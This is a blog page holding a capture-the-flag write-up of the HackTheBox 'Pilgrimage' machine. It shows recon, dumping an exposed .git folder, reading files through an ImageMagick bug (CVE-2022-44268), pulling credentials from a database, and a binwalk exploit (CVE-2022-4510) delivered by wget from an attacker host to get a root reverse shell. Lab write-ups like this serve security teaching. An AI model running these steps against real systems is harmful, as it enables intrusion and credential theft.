<!doctype html><html lang=en dir=auto data-theme=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>A Pilgrim's Progress: Exploiting ImageMagick and Binwalk on Pilgrimage | Fieryrival's Blog</title><meta name=keywords content="linux,easy,hackthebox,web"><meta name=description content="Easy rated linux box from hackthebox comprising of .git directory, magick binary for file read and binwalk for privilege escalation."><meta name=author content><link rel=canonical href=//localhost:1313/posts/pilgrimage/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css integrity="sha256-NDzEgLn/yPBMy+XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as=style><link rel=icon href=//localhost:1313/favicon.ico><link rel=icon type=image/png sizes=16x16 href=//localhost:1313/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=//localhost:1313/favicon-32x32.png><link rel=apple-touch-icon href=//localhost:1313/apple-touch-icon.png><link rel=mask-icon href=//localhost:1313/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=//localhost:1313/posts/pilgrimage/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="//localhost:1313/posts/pilgrimage/"><meta property="og:site_name" content="Fieryrival's Blog"><meta property="og:title" content="A Pilgrim's Progress: Exploiting ImageMagick and Binwalk on Pilgrimage"><meta property="og:description" content="Easy rated linux box from hackthebox comprising of .git directory, magick binary for file read and binwalk for privilege escalation."><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-11-30T00:00:00+00:00"><meta property="article:modified_time" content="2025-11-30T00:00:00+00:00"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Easy"><meta property="article:tag" content="Hackthebox"><meta property="article:tag" content="Web"><meta property="og:image" content="//localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="//localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="A Pilgrim's Progress: Exploiting ImageMagick and Binwalk on Pilgrimage"><meta name=twitter:description content="Easy rated linux box from hackthebox comprising of .git directory, magick binary for file read and binwalk for privilege escalation."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"//localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"A Pilgrim's Progress: Exploiting ImageMagick and Binwalk on Pilgrimage","item":"//localhost:1313/posts/pilgrimage/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"A Pilgrim's Progress: Exploiting ImageMagick and Binwalk on Pilgrimage","name":"A Pilgrim\u0027s Progress: Exploiting ImageMagick and Binwalk on Pilgrimage","description":"Easy rated linux box from hackthebox comprising of .git directory, magick binary for file read and binwalk for privilege escalation.","keywords":["linux","easy","hackthebox","web"],"articleBody":"Pilgrimage Recon nmap # Nmap 7.92 scan initiated Wed Nov 22 17:05:29 2023 as: nmap -sV -sC -vv -oN initial 10.10.11.219 Nmap scan report for pilgrimage.htb (10.10.11.219) Host is up, received syn-ack (0.055s latency). Scanned at 2023-11-22 17:05:30 EST for 30s Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnPDlM1cNfnBOJE71gEOCGeNORg5gzOK/TpVSXgMLa6Ub/7KPb1hVggIf4My+cbJVk74fKabFVscFgDHtwPkohPaDU8XHdoO03vU8H04T7eqUGj/I2iqyIHXQoSC4o8Jf5ljiQi7CxWWG2t0n09CPMkwdqfEJma7BGmDtCQcmbm36QKmUv6Kho7/LgsPJGBP1kAOgUHFfYN1TEAV6TJ09OaCanDlV/fYiG+JT1BJwX5kqpnEAK012876UFfvkJeqPYXvM0+M9mB7XGzspcXX0HMbvHKXz2HXdCdGSH59Uzvjl0dM+itIDReptkGUn43QTCpf2xJlL4EeZKZCcs/gu8jkuxXpo9lFVkqgswF/zAcxfksjytMiJcILg4Ca1VVMBs66ZHi5KOz8QedYM2lcLXJGKi+7zl3i8+adGTUzYYEvMQVwjXG0mPkHHSldstWMGwjXqQsPoQTclEI7XpdlRdjS6S/WXHixTmvXGTBhNXtrETn/fBw4uhJx4dLxNSJeM= | 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOaVAN4bg6zLU3rUMXOwsuYZ8yxLlkVTviJbdFijyp9fSTE6Dwm4e9pNI8MAWfPq0T0Za0pK0vX02ZjRcTgv3yg= | 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILGkCiJaVyn29/d2LSyMWelMlcrxKVZsCCgzm6JjcH1W 80/tcp open http syn-ack nginx/1.18.0 | http-methods: |_ Supported Methods: GET HEAD POST |_http-server-header: nginx/1.18.0 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Nov 22 17:06:00 2023 -- 1 IP address (1 host up) scanned in 30.92 seconds Website at TCP 80 While trying to enumerate the website manually, I let the subdirectory brute force run in the background. And got some valuable info from an expose .git folder.\n┌─[noob@parrot]─[~/htb/pilgrimage/notes] └──╼ $ffuf -c -w /home/noob/wordlists/raft-small-words.txt -u http://pilgrimage.htb/FUZZ -ic /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.4.1-dev ________________________________________________ :: Method : GET :: URL : http://pilgrimage.htb/FUZZ :: Wordlist : FUZZ: /home/noob/wordlists/raft-small-words.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ .htm [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 69ms] .html [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 61ms] tmp [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 71ms] assets [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 51ms] . [Status: 200, Size: 7621, Words: 2051, Lines: 199, Duration: 52ms] .htaccess [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 50ms] vendor [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 50ms] .git/HEAD [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 59ms] Used the tool git-dumper which automatically downloaded all the files in the .git directory and also gave source code from the object files.\n┌─[✗]─[noob@parrot]─[~/htb/pilgrimage/notes] └──╼ $git-dumper http://pilgrimage.htb/.git/ dump/ [-] Testing http://pilgrimage.htb/.git/HEAD [200] [-] Testing http://pilgrimage.htb/.git/ [403] [-] Fetching common files [-] Fetching http://pilgrimage.htb/.gitignore [404] [-] http://pilgrimage.htb/.gitignore responded with status code 404 [-] Fetching http://pilgrimage.htb/.git/COMMIT_EDITMSG [200] [-] Fetching http://pilgrimage.htb/.git/hooks/applypatch-msg.sample [200] [-] Fetching http://pilgrimage.htb/.git/hooks/post-commit.sample [404] [-] http://pilgrimage.htb/.git/hooks/post-commit.sample responded with status code 404 [-] Fetching http://pilgrimage.htb/.git/description [200] [-] Fetching http://pilgrimage.htb/.git/hooks/post-receive.sample [404] [-] http://pilgrimage.htb/.git/hooks/post-receive.sample responded with status code 404 [-] Fetching http://pilgrimage.htb/.git/hooks/commit-msg.sample [200] [-] Fetching http://pilgrimage.htb/.git/hooks/post-update.sample [200] [-] Fetching http://pilgrimage.htb/.git/hooks/pre-applypatch.sample [200] [-] Fetching http://pilgrimage.htb/.git/hooks/pre-rebase.sample [200] [-] Fetching http://pilgrimage.htb/.git/hooks/pre-receive.sample [200] [-] Fetching http://pilgrimage.htb/.git/index [200] [-] Fetching http://pilgrimage.htb/.git/hooks/update.sample [200] [-] Fetching http://pilgrimage.htb/.git/objects/info/packs [404] [-] http://pilgrimage.htb/.git/objects/info/packs responded with status code 404 [-] Fetching http://pilgrimage.htb/.git/info/exclude [200] [-] Fetching http://pilgrimage.htb/.git/hooks/pre-commit.sample [200] [-] Fetching http://pilgrimage.htb/.git/hooks/pre-push.sample [200] [-] Fetching http://pilgrimage.htb/.git/hooks/prepare-commit-msg.sample [200] [-] Finding refs/ [-] Fetching http://pilgrimage.htb/.git/FETCH_HEAD [404] [-] http://pilgrimage.htb/.git/FETCH_HEAD responded with status code 404 [-] Fetching http://pilgrimage.htb/.git/HEAD [200] [-] Fetching http://pilgrimage.htb/.git/config [200] We can see from the files that there are login functionalities, a register, and a magick binary.\n┌─[noob@parrot]─[~/htb/pilgrimage/notes/dump] └──╼ $ll total 27M drwxr-xr-x 1 noob noob 68 Nov 22 17:12 assets -rwxr-xr-x 1 noob noob 5.5K Nov 22 17:12 dashboard.php -rwxr-xr-x 1 noob noob 9.1K Nov 22 17:12 index.php -rwxr-xr-x 1 noob noob 6.7K Nov 22 17:12 login.php -rwxr-xr-x 1 noob noob 98 Nov 22 17:12 logout.php -rwxr-xr-x 1 noob noob 27M Nov 22 17:12 magick -rwxr-xr-x 1 noob noob 6.7K Nov 22 17:12 register.php drwxr-xr-x 1 noob noob 30 Nov 22 17:12 vendor From manual enumeration, we got two interesting possible weak points of attack. one being the login page and another the upload functionality. After trying some basic SQLi payloads, I moved towards the upload functionality.\nFrom the source files, we can see that magick binary was being used to shrink images. After checking the version of the binary, we can see that it was a vulnerable version.\nThe open-source ImageMagick suite enables users to create, edit, and manipulate images in various formats. A key feature is its support for multiple image types, including popular formats such as PNG, JPEG, and SVG. This lets users easily convert image formats, thus making ImageMagick a flexible solution for many image processing needs.\n┌─[noob@parrot]─[~/htb/pilgrimage/notes/dump] └──╼ $./magick -version Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org Copyright: (C) 1999 ImageMagick Studio LLC License: https://imagemagick.org/script/license.php Features: Cipher DPC HDRI OpenMP(4.5) Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib Compiler: gcc (7.5) CVE-2022-44268 Arbitrary File Read ImageMagick 7.1.0.49 beta was vulnerable to arbitrary file reading. The POC was available which showed creating a malicious image file which is processed by converting command embeds to file read inside the image metadata as hex and it can be read after decoding it from the processed image files.\n┌─[noob@parrot]─[~/htb/pilgrimage/notes/lfi] └──╼ $wget http://pilgrimage.htb/shrunk/655e31b0c7351.png --2023-11-22 17:24:00-- http://pilgrimage.htb/shrunk/655e31b0c7351.png Resolving pilgrimage.htb (pilgrimage.htb)... 10.10.11.219 Connecting to pilgrimage.htb (pilgrimage.htb)|10.10.11.219|:80... connected. HTTP request sent, awaiting response... 200 OK Length: 1080 (1.1K) [image/png] Saving to: ‘655e31b0c7351.png’ 655e31b0c7351.png 100%[================================\u003e] 1.05K --.-KB/s in 0s 2023-11-22 17:24:00 (66.9 MB/s) - ‘655e31b0c7351.png’ saved [1080/1080] ┌─[noob@parrot]─[~/htb/pilgrimage/notes/lfi] └──╼ $identify -verbose 655e31b0c7351.png Image: 655e31b0c7351.png Format: PNG (Portable Network Graphics) Geometry: 100x100 Class: PseudoClass Type: palette Depth: 1 bits-per-pixel component Channel Depths: Red: 1 bits Green: 1 bits Blue: 1 bits Channel Statistics: Red: Minimum: 65535.00 (1.0000) Maximum: 65535.00 (1.0000) Mean: 65535.00 (1.0000) Standard Deviation: 0.00 (0.0000) Green: Minimum: 0.00 (0.0000) Maximum: 0.00 (0.0000) Mean: 0.00 (0.0000) Standard Deviation: 0.00 (0.0000) Blue: Minimum: 0.00 (0.0000) Maximum: 0.00 (0.0000) Mean: 0.00 (0.0000) Standard Deviation: 0.00 (0.0000) Colors: 2 0: (255, 0, 0)\tred 1: (255,255,255)\twhite Gamma: 0.45455 Chromaticity: red primary: (0.64,0.33) green primary: (0.3,0.6) blue primary: (0.15,0.06) white point: (0.3127,0.329) Filesize: 1.1Ki Interlace: No Orientation: Unknown Background Color: #FEFEFE Border Color: #DFDFDF Matte Color: #BDBDBD Page geometry: 100x100+0+0 Compose: Over Dispose: Undefined Iterations: 0 Compression: Zip Png:IHDR.color-type-orig: 3 Png:IHDR.bit-depth-orig: 1 Raw profile type: 1437 726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d 6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f 6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e 2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269 6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f 62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d 65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a 2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a 783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f 6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372 2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73 706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31 303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f 6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573 722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d 646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b 75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f 7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69 7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67 696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73 62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d 5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e 6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334 3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e 2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374 656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72 6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65 6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e 0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052 65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f 6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973 74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573 796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69 7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c 6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d 652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78 3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f 7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f 737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938 3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a Date:create: 2023-11-22T16:52:00+00:00 Date:modify: 2023-11-22T16:52:00+00:00 Date:timestamp: 2023-11-22T16:52:01+00:00 Signature: c7d03a3453434db9720fd67b559185125d9bdb1fe9c25c182783170e2ba6a8f6 Tainted: False User Time: 0.010u Elapsed Time: 0m:0.002919s Pixels Per Second: 3.3Mi So, we are able to read files, what more info can we get from this? From the source files we can see that, there’s one SQLite file that is being read for login and loading images in the source code. We can go ahead and try to read that file.\nWe were able to get the SQLite file but in unformatted hex format and it was a bad option to retrieve the original with cyberchef. So, we can initially remove all the unnecessary new line characters. Here, I took the help of chatGPT after trying on my own.\nsed -i ':a;N;$!ba;s/\\n//g' db Then I created a simple Python script to decode the hex data and write the database file as binary. So that we can read it with SQLite.\n┌─[noob@parrot]─[~/htb/pilgrimage/notes/lfi] └──╼ $cat script.py f = open(\"db\",\"r\") data = f.read() data = bytes.fromhex(data) #print(data) with open(\"res.db\",\"wb\") as dest: dest.write(data) f.close() We were able to successfully retrieve credentials from the database file for three users and one of them emily had ssh access.\n┌─[✗]─[noob@parrot]─[~/htb/pilgrimage/notes/lfi] └──╼ $sqlite3 res.db SQLite version 3.34.1 2021-01-20 14:10:07 Enter \".help\" for usage hints. sqlite\u003e .tables images users sqlite\u003e select * from users; emily|abigchonkyboi123 admin|admin administrator|administrator Privilege Escalation After logging into emily we looked at what we could run as sudo but there wasn’t much.On enumerating internal processes with pspy, one of the processes seemed interesting which ran as root and executed the script “/usr/sbin/malewarescan.sh”\n2023/11/23 04:27:15 CMD: UID=0 PID=781 | /lib/systemd/systemd-logind 2023/11/23 04:27:15 CMD: UID=0 PID=776 | 2023/11/23 04:27:15 CMD: UID=0 PID=770 | /usr/sbin/rsyslogd -n -iNONE 2023/11/23 04:27:15 CMD: UID=0 PID=766 | /bin/bash /usr/sbin/malwarescan.sh 2023/11/23 04:27:15 CMD: UID=0 PID=765 | /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ 2023/11/23 04:27:15 CMD: UID=0 PID=764 | php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf) 2023/11/23 04:27:15 CMD: UID=0 PID=758 | /bin/bash /usr/sbin/malwarescan.sh 2023/11/23 04:27:15 CMD: UID=103 PID=753 | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 2023/11/23 04:27:15 CMD: UID=0 PID=750 | /usr/sbin/cron -f Went ahead and looked into the script and it was checking if a new file is created inside the directory “/var/www/pilgrimage.htb/shrunk/”, then it would read the file name and try to extract embedded binary files from the newly created file and after iterating over the extracted files and if detecting any Microsoft executable or executable script would remove the new file and break out of the loop.\nIt was actually made with the intention that when a user uploads any image file with executable binary embedded inside it, it would be removed so as to prevent unwanted malicious activity, also the shrunk folder was available to the end users. So, it could have been a possible attack vector.\nemily@pilgrimage:/dev/shm$ cat /usr/sbin/malwarescan.sh #!/bin/bash blacklist=(\"Executable script\" \"Microsoft executable\") /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do filename=\"/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo \"$FILE\" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')\" binout=\"$(/usr/local/bin/binwalk -e \"$filename\")\" for banned in \"${blacklist[@]}\"; do if [[ \"$binout\" == *\"$banned\"* ]]; then /usr/bin/rm \"$filename\" break fi done done Here, after checking the binwalk version, we can say that it was vulnerable to remote code execution.\nemily@pilgrimage:/usr/local/bin$ ./binwalk Binwalk v2.3.2 Craig Heffner, ReFirmLabs https://github.com/ReFirmLabs/binwalk CVE-2022-4510 An interesting point to note here is that there were two possible ways to trigger the exploit with the malicious payload. Either we can upload a file directly from the web portal or we can put the payload directly into the directory from our ssh session.\n┌─[noob@parrot]─[~/htb/pilgrimage/notes/priv] └──╼ $python3 bin-cve.py exploit 10.10.14.111 9001 ################################################ ------------------CVE-2022-4510---------------- ################################################ --------Binwalk Remote Command Execution-------- ------Binwalk 2.1.2b through 2.3.2 included----- ------------------------------------------------ ################################################ ----------Exploit by: Etienne Lacoche----------- ---------Contact Twitter: @electr0sm0g---------- ------------------Discovered by:---------------- ---------Q. Kaiser, ONEKEY Research Lab--------- ---------Exploit tested on debian 11------------ ################################################ You can now rename and share binwalk_exploit and start your local netcat listener. ┌─[noob@parrot]─[~/htb/pilgrimage/notes/priv] └──╼ $ll total 8.0K -rw-r--r-- 1 noob noob 2.8K Nov 22 18:12 bin-cve.py -rw-r--r-- 1 noob noob 682 Nov 22 18:14 binwalk_exploit.png -rw-r--r-- 1 noob noob 0 Nov 22 18:14 exploit For some reason the exploit would not work when using the web portal to upload the payload, possible reason could be that ImageMagick was modifying the payload. But when we directly put the file into the target directory we got reverse shell as root.\nemily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ wget 10.10.14.111:8000/binwalk_exploit.png --2023-11-23 04:46:17-- http://10.10.14.111:8000/binwalk_exploit.png Connecting to 10.10.14.111:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 682 [image/png] Saving to: 'binwalk_exploit.png' binwalk_exploit.png 100%[=================================\u003e] 682 --.-KB/s in 0s 2023-11-23 04:46:17 (101 MB/s) - 'binwalk_exploit.png' saved [682/682] References ImageMagick Exploit\nBinwalk exploit\nhttps://github.com/voidz0r/CVE-2022-44268\n","wordCount":"1799","inLanguage":"en","image":"//localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2025-11-30T00:00:00Z","dateModified":"2025-11-30T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"//localhost:1313/posts/pilgrimage/"},"publisher":{"@type":"Organization","name":"Fieryrival's Blog","logo":{"@type":"ImageObject","url":"//localhost:1313/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=//localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=//localhost:1313/apple-touch-icon_hu_ca5ae87867264747.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=//localhost:1313/about/ title="About Me"><span>About</span></a></li><li><a href=//localhost:1313/tags/ title=tags><span>tags</span></a></li><li><a href=//localhost:1313/posts/ title=posts><span>posts</span></a></li><li><a href=//localhost:1313/ title><span></span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=//localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=//localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">A Pilgrim's Progress: Exploiting ImageMagick and Binwalk on Pilgrimage</h1><div class=post-meta><span title='2025-11-30 00:00:00 +0000 UTC'>November 30, 2025</span>&nbsp;·&nbsp;<span>9 min</span>&nbsp;·&nbsp;<span>1799 words</span></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#recon>Recon</a><ul><li><a href=#nmap>nmap</a></li></ul></li><li><a href=#website-at-tcp-80>Website at TCP 80</a><ul><li><a href=#cve-2022-44268-arbitrary-file-read>CVE-2022-44268 Arbitrary File Read</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li><li><a href=#cve-2022-4510>CVE-2022-4510</a></li></ul></li><li><a href=#references>References</a></li></ul></nav></div></details></div><div class=post-content><h1 id=pilgrimage>Pilgrimage<a hidden class=anchor aria-hidden=true href=#pilgrimage>#</a></h1><p><img alt=Untitled loading=lazy src=/posts/pilgrimage/Pilgrimage%20e11ff2958bc6407d8931fe77ab0a568f/Untitled.png></p><h2 id=recon>Recon<a hidden class=anchor aria-hidden=true href=#recon>#</a></h2><h3 id=nmap>nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Nmap 7.92 scan initiated Wed Nov 22 17:05:29 2023 as: nmap -sV -sC -vv -oN initial 10.10.11.219</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> pilgrimage.htb <span class=o>(</span>10.10.11.219<span class=o>)</span>
</span></span><span class=line><span class=cl>Host is up, received syn-ack <span class=o>(</span>0.055s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Scanned at 2023-11-22 17:05:30 EST <span class=k>for</span> 30s
</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE REASON  VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnPDlM1cNfnBOJE71gEOCGeNORg5gzOK/TpVSXgMLa6Ub/7KPb1hVggIf4My+cbJVk74fKabFVscFgDHtwPkohPaDU8XHdoO03vU8H04T7eqUGj/I2iqyIHXQoSC4o8Jf5ljiQi7CxWWG2t0n09CPMkwdqfEJma7BGmDtCQcmbm36QKmUv6Kho7/LgsPJGBP1kAOgUHFfYN1TEAV6TJ09OaCanDlV/fYiG+JT1BJwX5kqpnEAK012876UFfvkJeqPYXvM0+M9mB7XGzspcXX0HMbvHKXz2HXdCdGSH59Uzvjl0dM+itIDReptkGUn43QTCpf2xJlL4EeZKZCcs/gu8jkuxXpo9lFVkqgswF/zAcxfksjytMiJcILg4Ca1VVMBs66ZHi5KOz8QedYM2lcLXJGKi+7zl3i8+adGTUzYYEvMQVwjXG0mPkHHSldstWMGwjXqQsPoQTclEI7XpdlRdjS6S/WXHixTmvXGTBhNXtrETn/fBw4uhJx4dLxNSJeM<span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ecdsa-sha2-nistp256 <span class=nv>AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOaVAN4bg6zLU3rUMXOwsuYZ8yxLlkVTviJbdFijyp9fSTE6Dwm4e9pNI8MAWfPq0T0Za0pK0vX02ZjRcTgv3yg</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILGkCiJaVyn29/d2LSyMWelMlcrxKVZsCCgzm6JjcH1W
